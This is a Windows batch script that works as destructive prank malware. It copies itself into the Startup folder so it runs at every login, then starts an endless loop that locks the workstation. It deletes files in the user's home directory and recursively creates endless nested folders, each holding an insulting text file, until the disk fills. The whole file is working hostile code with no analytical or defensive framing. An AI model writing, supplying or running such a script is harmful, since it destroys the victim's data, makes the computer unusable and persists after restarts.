COPY %0 "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
(
:Lock
rundll32.exe user32.dll, LockWorkStation
goto Lock
) > Lock.bat
start Lock.bat
del C:\Users\%username% /q
set /a num=1
:CreateFolderWithText
md LMAO_%num%
cd LMAO_%num%
echo You're such a dumbass, this is folder #%num% and there are many more to go! XD > Dumbass.txt
set num=%num%+1
goto CreateFolderWithText